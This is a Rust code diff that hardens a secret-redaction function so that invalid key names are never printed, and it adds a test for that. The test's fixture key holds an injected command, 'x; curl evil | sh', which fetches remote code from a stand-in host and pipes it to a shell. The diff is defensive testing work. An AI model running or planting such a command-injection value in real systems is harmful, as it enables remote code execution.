@@ -691,7 +691,17 @@ pub fn redact(s: &str, secrets: &BTreeMap<String, String>) -> String {
             i += 1;
         }
         out.push_str(&s[pos..start]);
-        let refs: Vec<String> = names.iter().map(|n| format!("secret:{n}")).collect();
+        // A key that is not a valid secret name is never printed as it is.
+        let refs: Vec<String> = names
+            .iter()
+            .map(|n| {
+                if secret_ref::is_valid_name(n) {
+                    format!("secret:{n}")
+                } else {
+                    "secret:(invalid name)".to_string()
+                }
+            })
+            .collect();
         out.push_str(&refs.join("+"));
         pos = end;
     }
@@ -1260,6 +1270,15 @@ mod tests {
         // Short values are still scrubbed.
         let l = Lint::new(LintLevel::Error, "c", "ü x ü");
         assert_eq!(scrub(vec![l], &s)[0].message, "ü secret:a ü");
+    }
+
+    #[test]
+    fn redact_never_prints_an_invalid_key() {
+        let mut secrets = BTreeMap::new();
+        secrets.insert("x; curl evil | sh".to_string(), "hunter22".to_string());
+        secrets.insert("ok-name".to_string(), "pass9999".to_string());
+        let out = redact("a hunter22 b pass9999", &secrets);
+        assert_eq!(out, "a secret:(invalid name) b secret:ok-name");
     }
 
     #[test]
